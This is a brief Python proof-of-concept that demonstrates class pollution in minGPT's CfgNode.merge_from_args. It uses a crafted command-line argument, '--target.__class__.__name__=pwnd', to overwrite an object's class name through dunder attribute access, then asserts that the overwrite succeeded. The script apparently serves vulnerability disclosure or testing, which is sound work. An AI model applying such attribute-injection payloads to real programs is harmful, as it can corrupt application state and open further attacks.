# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: CfgNode.merge_from_args (via CLI)
# Type: get-attr-set-attr
# Trigger: python train.py --model.__class__.__name__=pwnd

from mingpt.utils import CfgNode

class Target: pass
target = Target()

cfg = CfgNode()
cfg.target = target

payload_value = "pwnd"

def run_poc():
  # Simulates CLI: python train.py --target.__class__.__name__=pwnd
  cli_args = ["--target.__class__.__name__=" + payload_value]
  cfg.merge_from_args(cli_args)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
